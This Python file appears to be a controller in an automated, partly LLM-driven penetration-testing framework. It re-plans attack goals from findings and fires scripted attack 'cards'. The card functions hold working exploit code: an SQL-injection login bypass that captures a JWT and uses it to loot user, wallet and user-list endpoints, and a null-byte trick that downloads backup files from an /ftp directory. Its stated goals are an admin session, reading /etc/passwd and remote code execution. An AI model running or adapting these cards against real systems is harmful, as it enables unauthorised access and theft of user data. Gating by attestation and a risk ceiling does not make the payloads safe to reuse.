#!/usr/bin/env python3
"""reflex_loop — the ground->replan->re-dispatch controller (closes the spine's feedback loop).

The linear spine plans ONCE. This makes it react: after findings land, translate them into
Ariadne facts, REFRAME the plan (Ariadne re-plans as often as findings arrive), and fire
autoturret-style DETERMINISTIC cards at the exact point their precondition grounds — so
autoturret is no longer a front-of-run lane but a reflex that fires mid-attack (post-foothold
cred-reuse / loot / dump), cheaply and with no LLM. Everything touches the target THROUGH gexec.

  answers two design gaps at once:
   * "does Ariadne get reframed often?"  -> yes: once per round per open goal, driven by findings
   * "fire autoturret at different points" -> reflex cards trigger on grounded preconditions

Bounded: max_rounds + dry-stop. Content boundary: reads the SCRUBBED findings.jsonl (labels +
class), never the manager surface; it is part of the sighted attack lane (like the mapper).
"""
from __future__ import annotations
import argparse, json, os, re, subprocess, sys, time
from pathlib import Path

GB = Path("/opt/bs2/live")
SEAM_PY = GB / "governed_seam.py"
sys.path.insert(0, str(GB))
try:
    import impact as _impact
except Exception:
    _impact = None
try:
    from autoturret_planner import plan as ariadne_plan, _valid as fact_valid, PREDS
except Exception:
    PREDS = {}
    def ariadne_plan(goal, facts, negatives, top=3): return {"error": "planner import failed"}
    def fact_valid(f): return True

_SEV = {"low":1,"medium":2,"high":3,"critical":4}
CARD_IMPACT = {"card_auth_loot":"mutate","card_ftp_loot":"read"}

def _attested_set(run_dir):
    try:
        import subprocess as _sp
        out = _sp.run(["python3", str(SEAM_PY), "attested", "--run-dir", run_dir],
                      capture_output=True, text=True, timeout=30).stdout.strip()
        return set(json.loads(out)) if out else set()
    except Exception:
        return set()

def _atom(s):
    return re.sub(r"[^A-Za-z0-9_]", "_", str(s)).strip("_")[:48] or "x"

def _endpoint_in(label):
    m = re.search(r"(/(?:rest|api|ftp|graphql)/[A-Za-z0-9_\-/]{1,50})", label or "", re.I)
    return m.group(1) if m else None

# ---- findings (scrubbed) -> Ariadne facts (validated) -------------------------------------
def translate_findings(findings):
    """-> list of {fact, evidence_id, work_order_id, severity, vuln_class}. Provenance-bearing."""
    prov = []
    def add(f, fd):
        if fact_valid(f):
            prov.append({"fact": f, "evidence_id": fd.get("evidence_id"),
                         "work_order_id": fd.get("work_order_id"),
                         "severity": (fd.get("severity") or "low").lower(),
                         "vuln_class": (fd.get("vuln_class") or "").lower()})
    for fd in findings:
        vc = (fd.get("vuln_class") or "").lower()
        lbl = fd.get("label") or ""
        E = _endpoint_in(lbl) or ("/" + _atom(lbl.split()[0]) if lbl else None)
        if vc in ("sqli", "sql"):
            if E: add(["injectable", E], fd); add(["db_backed", E], fd)
        elif vc in ("nosqli", "nosql"):
            if E: add(["nosql_injectable", E], fd); add(["db_backed", E], fd)
        elif vc in ("auth", "auth-bypass", "jwt"):
            add(["session", "attacker", "admin"], fd)
            if re.search(r"token|jwt|cred|password|secret|bypass", lbl, re.I):
                add(["have_cred", _atom(vc + "_" + (E or "login"))], fd)
        elif vc in ("bac", "broken-access-control", "idor", "access"):
            add(["session", "attacker", "admin"], fd)
        elif vc in ("path-traversal", "traversal", "lfi"):
            if E: add(["serves_file_by_param", E], fd)
            add(["can_read", "attacker", "/etc/passwd"], fd)
        elif vc == "xss":
            if E: add(["renders_user_input", E], fd)
        elif vc in ("llm-injection", "llm"):
            add(["agent", _atom(E or "chatbot")], fd)
    return prov

OPEN_GOALS = [["session", "attacker", "admin"], ["can_read", "attacker", "/etc/passwd"], ["rce_as", "www-data"]]

# ---- deterministic reflex CARDS (autoturret-style), fired via gexec on a grounded precondition ---
def _gexec(run_dir, argv, cls="web.exploit", timeout=20):
    cmd = ["python3", str(SEAM_PY), "exec", "--run-dir", run_dir, "--class", cls, "--"] + argv
    try:
        p = subprocess.run(cmd, capture_output=True, timeout=timeout + 8)
        return p.stdout.decode("utf-8", "replace"), p.returncode
    except Exception as e:
        return f"(gexec error: {e})", 1

def card_auth_loot(run_dir, target):
    """cred-reuse fired mid-run: deterministic SQLi login -> mint JWT -> loot protected endpoints."""
    body = '{"email":"\' OR 1=1--","password":"x"}'
    out, _ = _gexec(run_dir, ["curl", "-sS", "-X", "POST", f"{target}/rest/user/login",
                              "-H", "Content-Type: application/json", "--data", body])
    m = re.search(r'"token"\s*:\s*"([A-Za-z0-9._\-]+)"', out)
    if not m:
        return {"card": "auth-loot", "fired": True, "grounded": False, "note": "no token from bypass"}
    jwt = m.group(1)
    looted = []
    for ep in ("/rest/user/whoami", "/rest/wallet/balance", "/api/Users/"):
        o, _ = _gexec(run_dir, ["curl", "-sS", ep.join((target, "")), "-H", f"Authorization: Bearer {jwt}"])
        looted.append((ep, len(o)))
    return {"card": "auth-loot", "fired": True, "grounded": True, "looted": looted, "token_len": len(jwt)}

def card_ftp_loot(run_dir, target):
    """serves_file_by_param grounded -> pull the /ftp dir + known backup via null-byte bypass."""
    out, _ = _gexec(run_dir, ["curl", "-sS", f"{target}/ftp"], cls="web.recon")
    got = []
    for f in ("package.json.bak%2500.md", "coupons_2013.md.bak%2500.md"):
        o, _ = _gexec(run_dir, ["curl", "-sS", f"{target}/ftp/{f}"])
        got.append((f, len(o)))
    return {"card": "ftp-loot", "fired": True, "grounded": True, "files": got}

# precondition predicate-name -> card
CARD_FOR = {"session": card_auth_loot, "have_cred": card_auth_loot,
            "serves_file_by_param": card_ftp_loot, "can_read": card_ftp_loot}

# ---- the loop ------------------------------------------------------------------------------
def run(run_dir, max_rounds, fire_cards, redispatch, verbose=True):
    run_dir = str(Path(run_dir).resolve())
    seam = json.loads((Path(run_dir) / "seam.json").read_text())
    target = seam["target"]
    facts_path = Path(run_dir) / "ariadne_facts.jsonl"
    facts = []
    if facts_path.exists():
        for l in facts_path.read_text().splitlines():
            try:
                f = json.loads(l)
                if isinstance(f, list): facts.append(f)
            except Exception: pass
    seen_find, seen_cards, negatives = set(), set(), []
    risk = os.environ.get("BS2_RISK", "safe")
    min_sev = _SEV.get(os.environ.get("REFLEX_MIN_SEV", "medium"), 2)
    attested = _attested_set(run_dir)
    armed_prov = {}   # predicate-name -> True once an ATTESTED, severe-enough fact grounds it
    retracted = set()
    log = (lambda m: print(m)) if verbose else (lambda m: None)
    log(f"● reflex loop — target {target}  (max_rounds={max_rounds}, cards={fire_cards}, risk={risk}, "
        f"min_sev={os.environ.get('REFLEX_MIN_SEV','medium')}, attested={len(attested)})")
    reframes = []
    for rnd in range(1, max_rounds + 1):
        fp = Path(run_dir) / "findings.jsonl"
        findings = []
        if fp.exists():
            for l in fp.read_text().splitlines():
                try: findings.append(json.loads(l))
                except Exception: pass
        for fd in findings:
            if fd.get("retract"): retracted.add(fd["retract"])
        new = [f for f in findings if f.get("evidence_id") and f.get("evidence_id") not in seen_find
               and not f.get("retract") and f.get("evidence_id") not in retracted]
        for f in new: seen_find.add(f.get("evidence_id"))
        if not new and rnd > 1:
            log(f"  round {rnd}: no new findings — loop dry, stopping"); break
        # 1) ground WITH PROVENANCE — facts feed PLANNING permissively; ARMING is gated separately
        prov = translate_findings(new)
        newfacts = []
        for p in prov:
            fct = p["fact"]
            if p["evidence_id"] in retracted: continue
            if fct not in facts:
                facts.append(fct); newfacts.append(fct)
            if p["work_order_id"] in attested and _SEV.get(p["severity"], 1) >= min_sev:
                armed_prov[fct[0]] = True
        if newfacts:
            with facts_path.open("a") as fh:
                for fx in newfacts: fh.write(json.dumps(fx) + "\n")
        log(f"  round {rnd}: +{len(new)} findings -> +{len(newfacts)} facts (total {len(facts)}); "
            f"armed preds: {sorted(armed_prov)}")
        # 2) REFRAME — Ariadne re-plans each round on ALL grounded terrain (advisory, permissive)
        for goal in OPEN_GOALS:
            pr = ariadne_plan(goal, facts, negatives)
            paths = (pr or {}).get("paths") or []
            if paths:
                ops = [s.get("name") for s in (paths[0].get("steps") or [])]
                reframes.append({"round": rnd, "goal": goal, "plan": ops})
                log(f"    ↻ REFRAME goal {goal} -> [{', '.join(ops) or 'GROUNDED'}]")
        # 3) fire reflex CARDS — GATED: precondition ARMED (attested+severe) AND impact<=risk ceiling
        if fire_cards:
            for pred, card in CARD_FOR.items():
                if pred not in armed_prov or card.__name__ in seen_cards: continue
                imp = CARD_IMPACT.get(card.__name__, "mutate")
                if _impact is not None and not _impact.allowed(imp, risk):
                    log(f"    ⃠ card {card.__name__} WITHHELD: impact '{imp}' exceeds risk ceiling '{risk}'"); continue
                seen_cards.add(card.__name__)
                log(f"    ⚡ autoturret card fires: {card.__name__} (armed by attested '{pred}', impact={imp})")
                res = card(run_dir, target)
                log(f"       -> {json.dumps({k:v for k,v in res.items() if k!='looted'})[:200]}")
        # 4) optional expert re-dispatch (LLM, gated)
        if redispatch and new:
            log("    ↦ (re-dispatch hook) reframed goals would re-task the relevant expert here (gated)")
        if not newfacts and rnd > 1:
            log(f"  round {rnd}: no new facts — stopping"); break
    (Path(run_dir) / "reframes.json").write_text(json.dumps(reframes, indent=2))
    log(f"● reflex loop done — {len(reframes)} reframes, {len(seen_cards)} cards fired. reframes.json written.")
    return {"reframes": len(reframes), "cards": len(seen_cards), "facts": len(facts)}

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--run-dir", required=True)
    ap.add_argument("--max-rounds", type=int, default=3)
    ap.add_argument("--no-cards", dest="cards", action="store_false", default=True)
    ap.add_argument("--redispatch", action="store_true", default=False)
    a = ap.parse_args()
    run(a.run_dir, a.max_rounds, a.cards, a.redispatch)

if __name__ == "__main__":
    main()
